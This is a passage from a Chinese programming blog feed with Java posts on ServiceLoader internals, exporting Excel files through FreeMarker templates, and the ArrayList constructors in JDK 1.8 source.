class="keyword">throw</span> <span class="keyword">new</span> UnsupportedOperationException();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     实际调用的迭代器方法,实际调用延迟迭代器的方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Iterator&lt;S&gt; <span class="title">iterator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Iterator&lt;S&gt;() &#123;</span><br><span class="line"></span><br><span class="line">            Iterator&lt;Map.Entry&lt;String,S&gt;&gt; knownProviders</span><br><span class="line">                = providers.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasNext</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (knownProviders.hasNext())</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                <span class="comment">//调用延迟迭代器的方法</span></span><br><span class="line">                <span class="keyword">return</span> lookupIterator.hasNext();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">public</span> S <span class="title">next</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (knownProviders.hasNext())</span><br><span class="line">                    <span class="keyword">return</span> knownProviders.next().getValue();</span><br><span class="line">                <span class="keyword">return</span> lookupIterator.next();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">remove</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> UnsupportedOperationException();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">      用给定的service和loader返回新的ServiceLoader对象</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;S&gt; <span class="function">ServiceLoader&lt;S&gt; <span class="title">load</span><span class="params">(Class&lt;S&gt; service,</span></span></span><br><span class="line"><span class="function"><span class="params">                                            ClassLoader loader)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ServiceLoader&lt;&gt;(service, loader);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     用给定的class和当前线程的上线文类加载器重新返回新的ServiceLoader</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;S&gt; <span class="function">ServiceLoader&lt;S&gt; <span class="title">load</span><span class="params">(Class&lt;S&gt; service)</span> </span>&#123;</span><br><span class="line">        ClassLoader cl = Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="keyword">return</span> ServiceLoader.load(service, cl);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 用扩展加载器来加载给定的service</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;S&gt; <span class="function">ServiceLoader&lt;S&gt; <span class="title">loadInstalled</span><span class="params">(Class&lt;S&gt; service)</span> </span>&#123;</span><br><span class="line">        ClassLoader cl = ClassLoader.getSystemClassLoader();</span><br><span class="line">        ClassLoader prev = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">while</span> (cl != <span class="keyword">null</span>) &#123;</span><br><span class="line">            prev = cl;</span><br><span class="line">            cl = cl.getParent();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ServiceLoader.load(service, prev);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * toString</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"java.util.ServiceLoader["</span> + service.getName() + <span class="string">"]"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>源码不多说了,也比较简单。涉及到类加载的问题,要深究的话可以参考下边的资料。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Service_provider_interface" target="_blank" rel="noopener">Service provider interface</a></li>
<li><a href="http://ifeve.com/classloader/" target="_blank" rel="noopener">深入浅出 ClassLoader</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>java导出word</title>
    <url>/2019/09/02/java/java%E5%AF%BC%E5%87%BAword/</url>
    <content><![CDATA[<p>在企业级应用中经常会有导出 word 或者 excel 的需求。通常的方法有直接用 POI 构造 word 或 excel 输出,还有一种是提前设计好模板只需填充数据即可。本文以最后一种方式来说明。</p>
<a id="more"></a>
<h1 id="准备模板"><a href="#准备模板" class="headerlink" title="准备模板"></a>准备模板</h1><p>新建 excel 模板:<br><img src="/2019/09/02/java/java导出word/2019-09-02_173355.png" alt></p>
<p>另存为 xml 后的内容为:</p>
<p><img src="/2019/09/02/java/java导出word/2019-09-02_164930.png" alt></p>
<p>注意要填充的目标字段属性不能被空格或其他字符破坏，否则数据填充失败.</p>
<h1 id="填充数据"><a href="#填充数据" class="headerlink" title="填充数据"></a>填充数据</h1><p>此处以简单的对象填充入手.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">exportExcel</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    Map&lt;String, Object&gt; map = Maps.newHashMap();</span><br><span class="line">    map.put(<span class="string">"month"</span>, <span class="string">"201908"</span>);</span><br><span class="line">    map.put(<span class="string">"name"</span>, <span class="string">"斯马拉森"</span>);</span><br><span class="line">    map.put(<span class="string">"empNo"</span>, <span class="string">"TN2018323223"</span>);</span><br><span class="line">    map.put(<span class="string">"baseSalary"</span>, <span class="string">"4000"</span>);</span><br><span class="line">    map.put(<span class="string">"salary"</span>, <span class="string">"50000"</span>);</span><br><span class="line">    Configuration configuration = <span class="keyword">new</span> Configuration();</span><br><span class="line">    configuration.setDefaultEncoding(<span class="string">"UTF-8"</span>);</span><br><span class="line">    <span class="comment">// 指定模板路径为/</span></span><br><span class="line">    configuration.setClassForTemplateLoading(ExportExcelTest.class.getClass(),<span class="string">"/"</span>);</span><br><span class="line">    Template template =</span><br><span class="line">    configuration.getTemplate(<span class="string">"salary.xml"</span>);</span><br><span class="line">    <span class="comment">// 指定输出目录</span></span><br><span class="line">    Writer writer = <span class="keyword">new</span> FileWriter(<span class="keyword">new</span> File(<span class="string">"c:/abc.xls"</span>));</span><br><span class="line">    template.process(map,writer);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>注意基础路径的设置,否则会抛出找不到模板文件的异常 freemarker.template.TemplateNotFoundException。<br>执行完成后即可看到目标文件已经生成,数据也填充成功.<br><img src="/2019/09/02/java/java导出word/2019-09-02_164630.png" alt></p>
<h1 id="list-填充"><a href="#list-填充" class="headerlink" title="list 填充"></a>list 填充</h1><p>简单对象填充后,一般都是 List 数据类型的导出.<br>修改 excel 对应的 xml 模板,加上 freemarker 的 List 标签。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">#list</span> <span class="attr">itemList</span> <span class="attr">as</span> <span class="attr">item</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Row</span> <span class="attr">ss:AutoFitHeight</span>=<span class="string">"0"</span> <span class="attr">ss:Height</span>=<span class="string">"55.5"</span> <span class="attr">ss:StyleID</span>=<span class="string">"s62"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Cell</span> <span class="attr">ss:StyleID</span>=<span class="string">"s72"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">Data</span> <span class="attr">ss:Type</span>=<span class="string">"String"</span>&gt;</span>$&#123;item.month&#125;<span class="tag">&lt;/<span class="name">Data</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Cell</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Cell</span> <span class="attr">ss:StyleID</span>=<span class="string">"s72"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">Data</span> <span class="attr">ss:Type</span>=<span class="string">"String"</span>&gt;</span>$&#123;item.name&#125;<span class="tag">&lt;/<span class="name">Data</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Cell</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Cell</span> <span class="attr">ss:StyleID</span>=<span class="string">"s72"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">Data</span> <span class="attr">ss:Type</span>=<span class="string">"String"</span>&gt;</span>$&#123;item.empNo&#125;<span class="tag">&lt;/<span class="name">Data</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Cell</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Cell</span> <span class="attr">ss:StyleID</span>=<span class="string">"s72"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">Data</span> <span class="attr">ss:Type</span>=<span class="string">"String"</span>&gt;</span>$&#123;item.baseSalary&#125;<span class="tag">&lt;/<span class="name">Data</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Cell</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Cell</span> <span class="attr">ss:StyleID</span>=<span class="string">"s72"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Cell</span> <span class="attr">ss:StyleID</span>=<span class="string">"s72"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Cell</span> <span class="attr">ss:StyleID</span>=<span class="string">"s72"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Cell</span> <span class="attr">ss:StyleID</span>=<span class="string">"s72"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Cell</span> <span class="attr">ss:StyleID</span>=<span class="string">"s72"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Cell</span> <span class="attr">ss:StyleID</span>=<span class="string">"s72"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Cell</span> <span class="attr">ss:StyleID</span>=<span class="string">"s72"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Cell</span> <span class="attr">ss:StyleID</span>=<span class="string">"s72"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Cell</span> <span class="attr">ss:StyleID</span>=<span class="string">"s72"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Cell</span> <span class="attr">ss:StyleID</span>=<span class="string">"s72"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Cell</span> <span class="attr">ss:StyleID</span>=<span class="string">"s72"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Cell</span> <span class="attr">ss:StyleID</span>=<span class="string">"s72"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">Data</span> <span class="attr">ss:Type</span>=<span class="string">"String"</span>&gt;</span>$&#123;item.salary&#125;<span class="tag">&lt;/<span class="name">Data</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Cell</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">Row</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">#list</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>修改导出程序如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExportExcelTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">Item</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String month;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String empNo;</span><br><span class="line">    <span class="keyword">private</span> String baseSalary;</span><br><span class="line">    <span class="keyword">private</span> String salary;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getMonth</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> month;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMonth</span><span class="params">(String month)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.month = month;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getEmpNo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> empNo;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setEmpNo</span><span class="params">(String empNo)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.empNo = empNo;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getBaseSalary</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> baseSalary;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setBaseSalary</span><span class="params">(String baseSalary)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.baseSalary = baseSalary;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getSalary</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> salary;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSalary</span><span class="params">(String salary)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.salary = salary;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * List导出</span></span><br><span class="line"><span class="comment">    **/</span></span><br><span class="line">  <span class="meta">@Test</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">exportListExcel</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">    Item item = <span class="keyword">new</span> Item();</span><br><span class="line">    item.setMonth(<span class="string">"201908"</span>);</span><br><span class="line">    item.setEmpNo(<span class="string">"SA322W"</span>);</span><br><span class="line">    item.setName(<span class="string">"王司机"</span>);</span><br><span class="line">    item.setBaseSalary(<span class="string">"4000"</span>);</span><br><span class="line">    item.setSalary(<span class="string">"50040"</span>);</span><br><span class="line"></span><br><span class="line">    Item item1 = <span class="keyword">new</span> Item();</span><br><span class="line">    item1.setMonth(<span class="string">"201908"</span>);</span><br><span class="line">    item1.setEmpNo(<span class="string">"SA322W"</span>);</span><br><span class="line">    item1.setName(<span class="string">"王司机"</span>);</span><br><span class="line">    item1.setBaseSalary(<span class="string">"4000"</span>);</span><br><span class="line">    item1.setSalary(<span class="string">"50040"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    List&lt;Item&gt; items = Lists.newArrayList(item,item1);</span><br><span class="line">    Map&lt;String,Object&gt; data = Maps.newHashMap();</span><br><span class="line">    data.put(<span class="string">"itemList"</span>,items);</span><br><span class="line">    Configuration configuration = <span class="keyword">new</span> Configuration();</span><br><span class="line">    configuration.setDefaultEncoding(<span class="string">"UTF-8"</span>);</span><br><span class="line">    configuration.setClassForTemplateLoading(ExportExcelTest.class.getClass(),<span class="string">"/"</span>);</span><br><span class="line">    Template template = configuration.getTemplate(<span class="string">"salary1.xml"</span>);</span><br><span class="line">    Writer writer = <span class="keyword">new</span> FileWriter(<span class="keyword">new</span> File(<span class="string">"c:/abc.xls"</span>));</span><br><span class="line">    template.process(data,writer);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>数据列表导出的时候一直报空,但是确实有数据.<br><img src="/2019/09/02/java/java导出word/2019-09-02_172128.png" alt><br>有点奇怪,终于在 stackoverflow 中找到了答案,封装的实体对象必须是 public 的。<br><img src="/2019/09/02/java/java导出word/2019-09-02_172553.png" alt></p>
<p>所以一定要将上边的 Item 对象声明为 public。</p>
<p>至此，excel 的导出模板完成,word 也是一样的道理.</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><p><a href="https://stackoverflow.com/questions/54686527/the-following-has-evaluated-to-null-or-missing-when-executing-freemarker" target="_blank" rel="noopener">the-following-has-evaluated-to-null-or-missing-when-executing-freemarker(stackoverflow)</a></p>
</li>
<li><p><a href="https://freemarker.apache.org/docs/pgui_quickstart_createdatamodel.html" target="_blank" rel="noopener">Create a data-model(Freemarker Official)</a></p>
</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>java序列化协议详解</title>
    <url>/2019/05/17/java/java%E5%BA%8F%E5%88%97%E5%8C%96%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html" target="_blank" rel="noopener">Object Serialization Stream Protocol</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>java集合源码分析之ArrayList</title>
    <url>/2018/05/31/java/java%E9%9B%86%E5%90%88%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B9%8BArrayList/</url>
    <content><![CDATA[<p>源码分析以JDK1.8为例.</p>
<p>ArrayList就是动态数组,就是Array的复杂版本.它提供了动态的增加和减少元素,实现了Collection和List接口,灵活的设置数组的大小等好处.UML图如下:</p>
<p><img src="/2018/05/31/java/java集合源码分析之ArrayList/arraylist_1.png" alt="ArrayList"></p>
<blockquote>
<h1 id="源码解读"><a href="#源码解读" class="headerlink" title="源码解读"></a>源码解读</h1><h2 id="公共属性"><a href="#公共属性" class="headerlink" title="公共属性"></a>公共属性</h2></blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> </span><br><span class="line"> <span class="comment">//默认容量</span></span><br><span class="line"> <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> DEFAULT_CAPACITY = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 空数据</span></span><br><span class="line"> <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Object[] EMPTY_ELEMENTDATA = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"> <span class="comment">//默认容量空数组</span></span><br><span class="line"> <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Object[] DEFAULTCAPACITY_EMPTY_ELEMENTDATA = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"> <span class="comment">//保存数据的数组</span></span><br><span class="line"> <span class="keyword">transient</span> Object[] elementData; </span><br><span class="line"></span><br><span class="line"> <span class="comment">//元素个数</span></span><br><span class="line"> <span class="keyword">private</span> <span class="keyword">int</span> size;</span><br><span class="line"></span><br><span class="line"><span class="comment">//最大数组长度</span></span><br><span class="line"><span class="comment">//一些虚拟机会在数组头部保存头信息,占用更多空间,导致OOM</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> MAX_ARRAY_SIZE = Integer.MAX_VALUE - <span class="number">8</span>;</span><br></pre></td></tr></table></figure>
<blockquote>
<h2 id="无参构造器"><a href="#无参构造器" class="headerlink" title="无参构造器"></a>无参构造器</h2></blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//初始化一个空数组</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ArrayList</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.elementData = DEFAULTCAPACITY_EMPTY_ELEMENTDATA;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<h2 id="int-构造器"><a href="#int-构造器" class="headerlink" title="int 构造器"></a>int 构造器</h2></blockquote>
<p>指定初始容量,大于0直接初始化;等于0初始化一个空数组,小于0抛出异常。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ArrayList</span><span class="params">(<span class="keyword">int</span> initialCapacity)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (initialCapacity &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.elementData = <span class="keyword">new</span> Object[initialCapacity];</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (initialCapacity == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.elementData = EMPTY_ELEMENTDATA;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Illegal Capacity: "</span>+</span><br><span class="line">                                               initialCapacity);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<h2 id="集合构造器"><a href="#集合构造器" class="headerlink" title="集合构造器"></a>集合构造器</h2></blockquote>
<p>集合参数转化为对象数组赋值给元素集合,如果有元素判断集合类型,如果不是Object[] 执行集合复制转化为Object[].<br>没有元素直接返回空集合.<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ArrayList</span><span class="params">(Collection&lt;? extends E&gt; c)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//转化为数组</span></span><br><span class="line">        elementData = c.toArray();</span><br><span class="line">        <span class="keyword">if</span> ((size = elementData.length) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// c.toArray might (incorrectly) not return Object[] (see 6260652)</span></span><br><span class="line">            <span class="keyword">if</span> (elementData.getClass() != Object[].class)</span><br><span class="line">                elementData = Arrays.copyOf(elementData, size, Object[].class);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//初始化为空集合</span></span><br><span class="line">            <span class="keyword">this</span>.elementData = EMPTY_ELEMENTDATA;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>有一个注释,c.toArray 可能不会返回Object[].让参考bug编号6260652.到oracle 官网查看bug<br><a href="https://bugs.java.com/bugdatabase/view_bug.do?bug_id=6260652" target="_blank" rel="noopener">https://bugs.java.com/bugdatabase/view_bug.do?bug_id=6260652</a></p>
<p>大意就是Arrays.asList 创建集合,再调用toArray返回的对象不是Object[]类型。测试一下看看:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        List&lt;Integer&gt; obj = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        obj.add(<span class="number">32</span>);</span><br><span class="line">        obj.add(<span class="number">344</span>);</span><br><span class="line">        List&lt;Integer&gt; ls = <span class="keyword">new</span> ArrayList&lt;&gt;(obj);</span><br><span class="line">        System.out.println(ls.size());</span><br><span class="line">        Object[] c = obj.toArray();</span><br><span class="line">        System.out.println(c.getClass());</span><br><span class="line">        System.out.println(Object[].class);</span><br><span class="line">        <span class="comment">//Arrays.asList创建</span></span><br><span class="line">        List&lt;Integer&gt; d = Arrays.asList(<span class="number">3</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line">        System.out.println(d.toArray().getClass());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2</span><br><span class="line">class [Ljava.lang.Object;</span><br><span class="line">class [Ljava.lang.Object;</span><br><span class="line">class [Ljava.lang.Integer;</span><br></pre></td></tr></table></figure>
<p>可见Arrays.asList 返回的是Integer[],并非Object[].<br>查看Arrays相关源码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//初始化ArrayList</span></span><br><span class="line"><span class="meta">@SafeVarargs</span></span><br><span class="line"><span class="meta">@SuppressWarnings</span>(<span class="string">"varargs"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">List&lt;T&gt; <span class="title">asList</span><span class="params">(T... a)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ArrayList&lt;&gt;(a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此处的ArrayList为Arrays的内部类.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayList</span>&lt;<span class="title">E</span>&gt; <span class="keyword">extends</span> <span class="title">AbstractList</span>&lt;<span class="title">E</span>&gt;</span></span><br><span class="line"><span class="class">        <span class="keyword">implements</span> <span class="title">RandomAccess</span>, <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">2764017481108945198L</span>;</span><br><span class="line">        <span class="comment">//泛型数组</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> E[] a;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//初始化</span></span><br><span class="line">        ArrayList(E[] array) &#123;</span><br><span class="line">            a = Objects.requireNonNull(array);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> a.length;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//调用a的clone方法</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Object[] toArray() &#123;</span><br><span class="line">            <span class="keyword">return</span> a.clone();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">        <span class="keyword">public</span> &lt;T&gt; T[] toArray(T[] a) &#123;</span><br><span class="line">            <span class="keyword">int</span> size = size();</span><br><span class="line">            <span class="keyword">if</span> (a.length &lt; size)</span><br><span class="line">                <span class="keyword">return</span> Arrays.copyOf(<span class="keyword">this</span>.a, size,</span><br><span class="line">                                     (Class&lt;? extends T[]&gt;) a.getClass());</span><br><span class="line">            System.arraycopy(<span class="keyword">this</span>.a, <span class="number">0</span>, a, <span class="number">0</span>, size);</span><br><span class="line">            <span class="keyword">if</span> (a.length &gt; size)</span><br><span class="line">                a[size] = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">return</span> a;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>官方显示,JDK9已经解决。<br>扩展一下,查看数组的clone方法,length属性的实现.<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> [] a = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line">    System.out.println(a.length);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span>  <span class="keyword">static</span>  <span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Integer[] f = &#123;<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line">    f.clone();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
